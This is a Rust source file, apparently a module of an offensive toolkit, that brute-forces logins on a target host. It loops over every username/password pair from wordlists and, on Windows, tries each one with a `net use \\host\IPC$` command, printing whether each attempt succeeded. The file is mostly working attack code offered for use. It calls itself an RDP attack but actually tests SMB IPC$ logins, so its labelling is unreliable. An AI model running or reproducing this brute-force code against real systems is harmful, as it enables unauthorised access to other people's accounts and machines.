use std::process::Command;

use crate::helpers::wordlists;

// Define a credential structure
#[derive(Debug, Clone)]
pub struct RdpCredential {
    pub host: String,
    pub username: String,
    pub password: String,
}

pub fn attack(host: String, _users: Option<Vec<String>>, _passwords: Option<Vec<String>>) {
    let users = _users.unwrap_or(wordlists::get_users(None, false));
    let passwords: Vec<String> = _passwords.unwrap_or(wordlists::get_passwords(None, false));

    #[cfg(target_os = "windows")]
    {
        let mut creds = Vec::new();

        for user in users {
            for pass in passwords.clone() {
                creds.push(RdpCredential {
                    host: host.clone(),
                    username: user.clone(),
                    password: pass.clone(),
                });
            }
        }

        creds
            .iter()
            .map(|c| {
                print!(
                    "[RDP] Bruteforce Attack | host: {} | username: {} | password: {}",
                    c.host, c.username, c.password
                );

                let _res = connect(&c.host, &c.username, &c.password);
                if _res {
                    println!("-> Success\n");
                } else {
                    println!("-> Failed\n");
                }
            })
            .collect()
    }
}

#[cfg(target_os = "windows")]
fn connect(host: &str, username: &str, password: &str) -> bool {
    // Run `net use` command to check login credentials

    use std::process::Stdio;
    let output = Command::new("cmd")
        .args(&[
            "/C",
            &format!("net use \\\\{}\\IPC$ /user:{} {}", host, username, password),
        ])
        .stdout(Stdio::piped()) // Capture standard output
        .stderr(Stdio::piped()) // Capture standard error
        .output();

    match output {
        Ok(output) => {
            if output.status.success() {
                String::from_utf8_lossy(&output.stdout)
                    .trim()
                    .to_string()
                    .contains("success")
            } else {
                false
            }
        }
        Err(_) => false,
    }
}
